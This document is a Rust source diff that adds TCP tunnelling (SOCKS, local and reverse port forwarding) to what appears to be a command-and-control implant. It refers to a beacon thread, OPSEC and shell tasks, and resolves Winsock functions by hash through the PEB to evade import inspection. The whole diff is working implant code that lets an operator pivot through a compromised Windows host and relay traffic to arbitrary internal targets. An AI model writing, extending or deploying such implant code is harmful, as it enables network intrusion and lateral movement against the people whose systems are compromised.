@@ -114,6 +114,15 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::TokenPrivs => token_privs(instance, id, results),
         Task::ShellStart { .. } => shell_start(instance, &task, id, results),
         Task::ShellWrite { .. } => shell_write(instance, &task, id, results),
+        Task::TunnelStartTcp { .. } => tunnel_start_tcp(instance, &task, id, results),
+        Task::TunnelClose { channel_id } => tunnel_close(instance, channel_id),
+        Task::TunnelPause { channel_id } => {
+            tunnel_pause_resume(instance, channel_id, true, results)
+        }
+        Task::TunnelResume { channel_id } => {
+            tunnel_pause_resume(instance, channel_id, false, results)
+        }
+        Task::TunnelReverse { .. } => tunnel_reverse(instance, &task, id, results),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
@@ -3027,4 +3036,604 @@ fn shell_filter_echo(instance: &mut Instance, idx: usize, data: &[u8]) -> usize 
     }
     job.line_len = 0;
     skip
+}
+
+// --- tunnels: socks / lportfwd / rportfwd (port of the native tunnel.c
+// against the v1.2 TunnelCallbacks wire — TCP only like the original;
+// WS2_32 by hash, per-connection channels drained every cycle) --------
+
+const H_WS2_32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("ws2_32.dll");
+const WS2_32_DLL: &[u8] = b"ws2_32.dll\0";
+const H_WSA_STARTUP: u64 = fnv1a64(b"WSAStartup");
+const H_WSA_GET_LAST_ERROR: u64 = fnv1a64(b"WSAGetLastError");
+const H_SOCKET: u64 = fnv1a64(b"socket");
+const H_CLOSESOCKET: u64 = fnv1a64(b"closesocket");
+const H_CONNECT: u64 = fnv1a64(b"connect");
+const H_SEND: u64 = fnv1a64(b"send");
+const H_RECV: u64 = fnv1a64(b"recv");
+const H_SELECT: u64 = fnv1a64(b"select");
+const H_IOCTLSOCKET: u64 = fnv1a64(b"ioctlsocket");
+const H_INET_ADDR: u64 = fnv1a64(b"inet_addr");
+const H_GETHOSTBYNAME: u64 = fnv1a64(b"gethostbyname");
+const H_SHUTDOWN: u64 = fnv1a64(b"shutdown");
+const H_BIND: u64 = fnv1a64(b"bind");
+const H_LISTEN: u64 = fnv1a64(b"listen");
+const H_ACCEPT: u64 = fnv1a64(b"accept");
+const H_SETSOCKOPT: u64 = fnv1a64(b"setsockopt");
+
+const AF_INET: i32 = 2;
+const SOCK_STREAM: i32 = 1;
+const IPPROTO_TCP: i32 = 6;
+const FIONBIO: i32 = 0x8004_667Eu32 as i32;
+const SOL_SOCKET: i32 = 0xFFFF;
+const SO_REUSEADDR: i32 = 4;
+const SD_BOTH: i32 = 2;
+/// Tunnel states (native SPT_TUNNEL_STATE_*).
+const TUNNEL_STATE_READY: u8 = 1;
+const TUNNEL_STATE_LISTEN: u8 = 2;
+/// Marked by a send/recv failure — the CLOSE record is emitted at the
+/// next tick, then the tunnel is reaped.
+const TUNNEL_STATE_CLOSING: u8 = 3;
+/// Per-tunnel read chunk per cycle.
+const TUNNEL_READ_BUF: usize = 4 * 1024;
+/// fd_set (Windows): `u_int fd_count; SOCKET fd_array[64]`.
+const FD_SET_SIZE: usize = 4 + 8 * 64;
+
+/// One tunnel channel: a connected socket (socks/lportfwd/rportfwd
+/// accepted) or the rportfwd listener itself.
+#[derive(Clone, Copy)]
+pub struct Tunnel {
+    pub channel_id: u32,
+    pub sock: usize,
+    pub state: u8,
+    pub paused: bool,
+}
+
+/// Concurrent tunnel channels (socks browsing opens several connections).
+pub const MAX_TUNNELS: usize = 16;
+
+impl Tunnel {
+    pub const EMPTY: Tunnel = Tunnel {
+        channel_id: 0,
+        sock: 0,
+        state: 0,
+        paused: false,
+    };
+}
+
+/// Resolve ws2_32 once (PEB then LoadLibraryA) and run WSAStartup. The
+/// module pointer lives on the instance (0 = unresolved).
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 resolved on the instance.
+pub unsafe fn tunnel_surface(instance: &mut Instance) -> bool {
+    if !instance.ws2.is_null() {
+        return true;
+    }
+    let peb = crate::runtime::bootstrap::get_peb() as *const specter_core::peb::Peb;
+    let ws2 = load_module(peb, instance.kernel32, H_WS2_32, WS2_32_DLL);
+    if ws2.is_null() {
+        return false;
+    }
+    let startup = peb::find_export(ws2, H_WSA_STARTUP);
+    if startup.is_null() {
+        return false;
+    }
+    let startup = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u16, *mut u8) -> i32,
+    >(startup as *const core::ffi::c_void);
+    // WSADATA is ~400 bytes; the call only writes its header fields.
+    let mut wsa_data = [0u8; 512];
+    if startup(0x0202, wsa_data.as_mut_ptr()) != 0 {
+        return false;
+    }
+    instance.ws2 = ws2;
+    true
+}
+
+/// Build a sockaddr_in (16 bytes): family BE u16, port BE u16, address
+/// network-order u32, zero padding.
+fn sockaddr_in(port_be: u16, addr_net: u32) -> [u8; 16] {
+    let mut sa = [0u8; 16];
+    // sin_family: native u16 (LE on x64).
+    sa[0] = AF_INET as u8;
+    sa[1] = 0;
+    sa[2] = (port_be >> 8) as u8;
+    sa[3] = port_be as u8;
+    sa[4] = addr_net as u8;
+    sa[5] = (addr_net >> 8) as u8;
+    sa[6] = (addr_net >> 16) as u8;
+    sa[7] = (addr_net >> 24) as u8;
+    sa
+}
+
+/// `tunnel start` (COMMAND_TUNNEL_START_TCP): connect to the target
+/// (blocking connect, like the native), flip to non-blocking, register
+/// the channel. Result: 0 = ok, else the WSA error code.
+///
+/// # Safety
+///
+/// Beacon thread; ws2 resolvable.
+pub unsafe fn tunnel_start_tcp(
+    instance: &mut Instance,
+    task: &Task,
+    _id: u32,
+    results: &mut Writer,
+) {
+    let Task::TunnelStartTcp {
+        channel_id,
+        addr_len,
+        addr,
+        port,
+    } = task
+    else {
+        return;
+    };
+    if !tunnel_surface(instance) {
+        let _ = transport::push_tunnel_start_result(&mut *results, *channel_id, 1);
+        return;
+    }
+    // Duplicate channel or full table: report a clean close.
+    let mut dup = false;
+    let mut i = 0usize;
+    while i < instance.tunnels_len {
+        if instance.tunnels[i].channel_id == *channel_id {
+            dup = true;
+        }
+        i += 1;
+    }
+    if dup || instance.tunnels_len >= MAX_TUNNELS {
+        let _ = transport::push_tunnel_start_result(&mut *results, *channel_id, 1);
+        return;
+    }
+    let ws2 = instance.ws2;
+    let socket = peb::find_export(ws2, H_SOCKET);
+    let connect = peb::find_export(ws2, H_CONNECT);
+    let closesocket = peb::find_export(ws2, H_CLOSESOCKET);
+    let ioctl = peb::find_export(ws2, H_IOCTLSOCKET);
+    let inet_addr = peb::find_export(ws2, H_INET_ADDR);
+    let gethostbyname = peb::find_export(ws2, H_GETHOSTBYNAME);
+    let get_last_error = peb::find_export(ws2, H_WSA_GET_LAST_ERROR);
+    if socket.is_null() || connect.is_null() || closesocket.is_null() || ioctl.is_null() {
+        let _ = transport::push_tunnel_start_result(&mut *results, *channel_id, 1);
+        return;
+    }
+    let socket = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(i32, i32, i32) -> usize,
+    >(socket as *const core::ffi::c_void);
+    let connect = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, *const u8, i32) -> i32,
+    >(connect as *const core::ffi::c_void);
+    let closesocket = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize) -> i32,
+    >(closesocket as *const core::ffi::c_void);
+    let ioctl = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, i32, *mut u32) -> i32,
+    >(ioctl as *const core::ffi::c_void);
+
+    // Address: NUL-terminated copy.
+    let mut addr_buf = [0u8; transport::TUNNEL_ADDR_CAP + 1];
+    let n = (*addr_len as usize).min(transport::TUNNEL_ADDR_CAP);
+    let mut i = 0;
+    while i < n {
+        addr_buf[i] = addr[i];
+        i += 1;
+    }
+    addr_buf[n] = 0;
+
+    // Resolve: dotted quad first, DNS fallback.
+    let mut ip_net: u32 = 0xFFFF_FFFF; // INADDR_NONE
+    if !inet_addr.is_null() {
+        let inet_addr = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8) -> u32,
+        >(inet_addr as *const core::ffi::c_void);
+        ip_net = inet_addr(addr_buf.as_ptr());
+    }
+    if ip_net == 0xFFFF_FFFF && !gethostbyname.is_null() {
+        let gethostbyname = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8) -> *mut *mut u8,
+        >(gethostbyname as *const core::ffi::c_void);
+        let he = gethostbyname(addr_buf.as_ptr());
+        if !he.is_null() {
+            // struct hostent: name(8) aliases(8) addrtype(8) length(8)
+            // addr_list(8) — the char** list pointer at offset 32, the
+            // first in_addr* behind it.
+            let list = he.add(4).read_unaligned();
+            if !list.is_null() {
+                // list IS the address of the first char* element.
+                let first = (list as *const *mut u8).read_unaligned();
+                if !first.is_null() {
+                    ip_net = (first as *const u32).read_unaligned();
+                }
+            }
+        }
+    }
+    if ip_net == 0xFFFF_FFFF {
+        let _ = transport::push_tunnel_start_result(&mut *results, *channel_id, 1);
+        return;
+    }
+
+    let sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if sock == usize::MAX {
+        let _ = transport::push_tunnel_start_result(&mut *results, *channel_id, 1);
+        return;
+    }
+    let sa = sockaddr_in(*port as u16, ip_net);
+    if connect(sock, sa.as_ptr(), 16) != 0 {
+        let mut wsa_err = 1u32;
+        if !get_last_error.is_null() {
+            let get_last_error = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn() -> i32,
+            >(get_last_error as *const core::ffi::c_void);
+            wsa_err = get_last_error() as u32;
+        }
+        closesocket(sock);
+        let _ = transport::push_tunnel_start_result(&mut *results, *channel_id, wsa_err);
+        return;
+    }
+    // Non-blocking from here (the cycle drains it).
+    let mut non_block: u32 = 1;
+    ioctl(sock, FIONBIO, &mut non_block as *mut u32);
+
+    instance.tunnels[instance.tunnels_len] = Tunnel {
+        channel_id: *channel_id,
+        sock,
+        state: TUNNEL_STATE_READY,
+        paused: false,
+    };
+    instance.tunnels_len += 1;
+    crate::runtime::debug::log(&*(instance as *const Instance), b"tn: start ok\n");
+    let _ = transport::push_tunnel_start_result(&mut *results, *channel_id, 0);
+}
+
+/// `tunnel write` (COMMAND_TUNNEL_WRITE_TCP): server data to the socket.
+///
+/// # Safety
+///
+/// Beacon thread; ws2 resolved.
+pub unsafe fn tunnel_write_tcp(instance: &mut Instance, channel_id: u32, data: &[u8]) {
+    let Some(idx) = tunnel_find(instance, channel_id) else {
+        return;
+    };
+    if instance.tunnels[idx].paused || instance.tunnels[idx].state != TUNNEL_STATE_READY {
+        return;
+    }
+    let send = peb::find_export(instance.ws2, H_SEND);
+    if send.is_null() {
+        return;
+    }
+    let send = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, *const u8, i32, i32) -> i32,
+    >(send as *const core::ffi::c_void);
+    let n = data.len();
+    crate::runtime::debug::log(&*(instance as *const Instance), b"tn: write\n");
+    let sent = send(instance.tunnels[idx].sock, data.as_ptr(), n as i32, 0);
+    if sent <= 0 && n > 0 {
+        // Socket dead: the CLOSE record goes out at the next tick.
+        instance.tunnels[idx].state = TUNNEL_STATE_CLOSING;
+    }
+}
+
+fn tunnel_find(instance: &Instance, channel_id: u32) -> Option<usize> {
+    let mut i = 0usize;
+    while i < instance.tunnels_len {
+        if instance.tunnels[i].channel_id == channel_id {
+            return Some(i);
+        }
+        i += 1;
+    }
+    None
+}
+
+/// `tunnel close` (COMMAND_TUNNEL_CLOSE): server-side close — teardown
+/// without a record (the server already knows).
+///
+/// # Safety
+///
+/// Beacon thread; ws2 resolved.
+pub unsafe fn tunnel_close(instance: &mut Instance, channel_id: u32) {
+    crate::runtime::debug::log(&*(instance as *const Instance), b"tn: closetask\n");
+    let Some(idx) = tunnel_find(instance, channel_id) else {
+        return;
+    };
+    let shutdown = peb::find_export(instance.ws2, H_SHUTDOWN);
+    let closesocket = peb::find_export(instance.ws2, H_CLOSESOCKET);
+    let sock = instance.tunnels[idx].sock;
+    if !shutdown.is_null() {
+        let shutdown = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(usize, i32) -> i32,
+        >(shutdown as *const core::ffi::c_void);
+        shutdown(sock, SD_BOTH);
+    }
+    if !closesocket.is_null() {
+        let closesocket = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(usize) -> i32,
+        >(closesocket as *const core::ffi::c_void);
+        closesocket(sock);
+    }
+    tunnel_remove(instance, idx);
+}
+
+/// `tunnel pause/resume`: flip the flag, ack with a header record.
+///
+/// # Safety
+///
+/// Beacon thread.
+pub unsafe fn tunnel_pause_resume(
+    instance: &mut Instance,
+    channel_id: u32,
+    pause: bool,
+    results: &mut Writer,
+) {
+    let Some(idx) = tunnel_find(instance, channel_id) else {
+        return;
+    };
+    instance.tunnels[idx].paused = pause;
+    let cmd = if pause {
+        transport::COMMAND_TUNNEL_PAUSE
+    } else {
+        transport::COMMAND_TUNNEL_RESUME
+    };
+    let _ = transport::push_tunnel_flag_result(&mut *results, channel_id, cmd);
+}
+
+/// `tunnel reverse` (COMMAND_TUNNEL_REVERSE, rportfwd): bind a loopback
+/// listener (OPSEC: 127.0.0.1 only, like the native).
+///
+/// # Safety
+///
+/// Beacon thread; ws2 resolvable.
+pub unsafe fn tunnel_reverse(instance: &mut Instance, task: &Task, _id: u32, results: &mut Writer) {
+    let Task::TunnelReverse { tunnel_id, port } = task else {
+        return;
+    };
+    if !tunnel_surface(instance) {
+        let _ = transport::push_tunnel_reverse_result(&mut *results, *tunnel_id, 0);
+        return;
+    }
+    let ws2 = instance.ws2;
+    let socket = peb::find_export(ws2, H_SOCKET);
+    let setsockopt = peb::find_export(ws2, H_SETSOCKOPT);
+    let bind = peb::find_export(ws2, H_BIND);
+    let listen = peb::find_export(ws2, H_LISTEN);
+    let ioctl = peb::find_export(ws2, H_IOCTLSOCKET);
+    let closesocket = peb::find_export(ws2, H_CLOSESOCKET);
+    if socket.is_null() || bind.is_null() || listen.is_null() || ioctl.is_null() {
+        let _ = transport::push_tunnel_reverse_result(&mut *results, *tunnel_id, 0);
+        return;
+    }
+    let socket = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(i32, i32, i32) -> usize,
+    >(socket as *const core::ffi::c_void);
+    let bind = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, *const u8, i32) -> i32,
+    >(bind as *const core::ffi::c_void);
+    let listen = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, i32) -> i32,
+    >(listen as *const core::ffi::c_void);
+    let ioctl = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, i32, *mut u32) -> i32,
+    >(ioctl as *const core::ffi::c_void);
+    let closesocket = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize) -> i32,
+    >(closesocket as *const core::ffi::c_void);
+
+    let sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if sock == usize::MAX {
+        let _ = transport::push_tunnel_reverse_result(&mut *results, *tunnel_id, 0);
+        return;
+    }
+    if !setsockopt.is_null() {
+        let setsockopt = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(usize, i32, i32, *const u8, i32) -> i32,
+        >(setsockopt as *const core::ffi::c_void);
+        let optval: i32 = 1;
+        setsockopt(
+            sock,
+            SOL_SOCKET,
+            SO_REUSEADDR,
+            &optval as *const i32 as *const u8,
+            4,
+        );
+    }
+    // 127.0.0.1 in network byte order — never expose the listener.
+    let sa = sockaddr_in(*port as u16, 0x0100_007F);
+    if bind(sock, sa.as_ptr(), 16) != 0 || listen(sock, 10) != 0 {
+        closesocket(sock);
+        let _ = transport::push_tunnel_reverse_result(&mut *results, *tunnel_id, 0);
+        return;
+    }
+    let mut non_block: u32 = 1;
+    ioctl(sock, FIONBIO, &mut non_block as *mut u32);
+
+    // A fresh listener slot (the same tunnelId may be reused after stop).
+    let slot = instance.tunnels_len;
+    if slot >= MAX_TUNNELS {
+        let _ = transport::push_tunnel_reverse_result(&mut *results, *tunnel_id, 0);
+        return;
+    }
+    instance.tunnels[slot] = Tunnel {
+        channel_id: *tunnel_id,
+        sock,
+        state: TUNNEL_STATE_LISTEN,
+        paused: false,
+    };
+    instance.tunnels_len += 1;
+    let _ = transport::push_tunnel_reverse_result(&mut *results, *tunnel_id, 1);
+}
+
+/// Tunnel teardown at a table index (manual tail shift).
+fn tunnel_remove(instance: &mut Instance, idx: usize) {
+    let mut j = idx;
+    while j + 1 < instance.tunnels_len {
+        instance.tunnels[j] = instance.tunnels[j + 1];
+        j += 1;
+    }
+    instance.tunnels_len -= 1;
+}
+
+/// Cycle-driven tunnel I/O (native SptProcessTunnels): listeners accept,
+/// ready channels drain (select + recv), closing channels emit their
+/// CLOSE record and die.
+///
+/// # Safety
+///
+/// Beacon thread; ws2 resolved.
+pub unsafe fn tunnel_tick(instance: &mut Instance, w: &mut Writer) {
+    if instance.ws2.is_null() || instance.tunnels_len == 0 {
+        return;
+    }
+    crate::runtime::debug::log(&*(instance as *const Instance), b"tn: tick\n");
+    let ws2 = instance.ws2;
+    let accept_ptr = peb::find_export(ws2, H_ACCEPT);
+    let select_ptr = peb::find_export(ws2, H_SELECT);
+    let recv_ptr = peb::find_export(ws2, H_RECV);
+    let shutdown_ptr = peb::find_export(ws2, H_SHUTDOWN);
+    let closesocket_ptr = peb::find_export(ws2, H_CLOSESOCKET);
+    let ioctl_ptr = peb::find_export(ws2, H_IOCTLSOCKET);
+    if accept_ptr.is_null()
+        || select_ptr.is_null()
+        || recv_ptr.is_null()
+        || closesocket_ptr.is_null()
+    {
+        crate::runtime::debug::log(&*(instance as *const Instance), b"tn: noexport\n");
+        return;
+    }
+    let accept = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, *mut u8, *mut i32) -> usize,
+    >(accept_ptr as *const core::ffi::c_void);
+    let select = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(i32, *mut u8, *mut u8, *mut u8, *mut u8) -> i32,
+    >(select_ptr as *const core::ffi::c_void);
+    let recv = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, *mut u8, i32, i32) -> i32,
+    >(recv_ptr as *const core::ffi::c_void);
+    let shutdown = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize, i32) -> i32,
+    >(shutdown_ptr as *const core::ffi::c_void);
+    let closesocket = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(usize) -> i32,
+    >(closesocket_ptr as *const core::ffi::c_void);
+    let ioctl = if ioctl_ptr.is_null() {
+        None
+    } else {
+        Some(core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(usize, i32, *mut u32) -> i32,
+        >(ioctl_ptr as *const core::ffi::c_void))
+    };
+
+    let mut rd_buf = [0u8; TUNNEL_READ_BUF];
+    let mut fds;
+    let mut tv; // timeval: sec, usec (both zero)
+
+    let mut i = 0usize;
+    while i < instance.tunnels_len {
+        let tun = instance.tunnels[i];
+
+        // Listener: accept pending inbound connections (rportfwd).
+        if tun.state == TUNNEL_STATE_LISTEN {
+            let mut addr_buf = [0u8; 16];
+            let mut addr_len: i32 = 16;
+            let new_sock = accept(tun.sock, addr_buf.as_mut_ptr(), &mut addr_len);
+            if new_sock != usize::MAX {
+                if let Some(ioctl) = ioctl {
+                    let mut non_block: u32 = 1;
+                    ioctl(new_sock, FIONBIO, &mut non_block as *mut u32);
+                }
+                if instance.tunnels_len < MAX_TUNNELS {
+                    // Channel id for the accepted connection: a fresh
+                    // RNG draw (the native uses SptRand32).
+                    let new_channel = (instance.rng.next_u64() as u32) | 1;
+                    instance.tunnels[instance.tunnels_len] = Tunnel {
+                        channel_id: new_channel,
+                        sock: new_sock,
+                        state: TUNNEL_STATE_READY,
+                        paused: false,
+                    };
+                    instance.tunnels_len += 1;
+                    let _ =
+                        transport::push_tunnel_accept_result(&mut *w, tun.channel_id, new_channel);
+                } else {
+                    closesocket(new_sock);
+                }
+            }
+            i += 1;
+            continue;
+        }
+
+        // Ready: drain available bytes (select with zero timeout).
+        if tun.state == TUNNEL_STATE_READY && !tun.paused {
+            fds = [0u8; FD_SET_SIZE];
+            let count = fds.as_mut_ptr() as *mut u32;
+            *count = 1;
+            (fds.as_mut_ptr().add(8) as *mut usize).write_unaligned(tun.sock);
+            tv = [0u8; 8];
+            let sel = select(
+                0,
+                fds.as_mut_ptr(),
+                core::ptr::null_mut(),
+                core::ptr::null_mut(),
+                tv.as_mut_ptr(),
+            );
+            {
+                let mut line = [0u8; 16];
+                line[..8].copy_from_slice(b"tn: sel ");
+                line[8..12].copy_from_slice(&(sel as u32).to_le_bytes());
+                line[12] = b'\n';
+                crate::runtime::debug::log(&*(instance as *const Instance), &line[..13]);
+            }
+            if sel > 0 {
+                let n = recv(tun.sock, rd_buf.as_mut_ptr(), TUNNEL_READ_BUF as i32, 0);
+                if n > 0 {
+                    crate::runtime::debug::log(&*(instance as *const Instance), b"tn: recv\n");
+                    let slice = &rd_buf[..n as usize];
+                    // Atomic record: only when it fits.
+                    let need = 10 + 4 + slice.len() + 4;
+                    if w.remaining() >= need {
+                        let _ = transport::push_tunnel_write_result(&mut *w, tun.channel_id, slice);
+                    }
+                } else if n == 0 {
+                    // Peer closed.
+                    instance.tunnels[i].state = TUNNEL_STATE_CLOSING;
+                }
+                // n < 0: WSAEWOULDBLOCK is the normal non-blocking case.
+            }
+        }
+
+        // Closing: notify the server and reap.
+        if instance.tunnels[i].state == TUNNEL_STATE_CLOSING {
+            crate::runtime::debug::log(&*(instance as *const Instance), b"tn: close\n");
+            let _ = transport::push_tunnel_close_result(&mut *w, tun.channel_id);
+            let sock = instance.tunnels[i].sock;
+            shutdown(sock, SD_BOTH);
+            closesocket(sock);
+            tunnel_remove(instance, i);
+            continue; // the shifted tail needs the same index again
+        }
+        i += 1;
+    }
 }
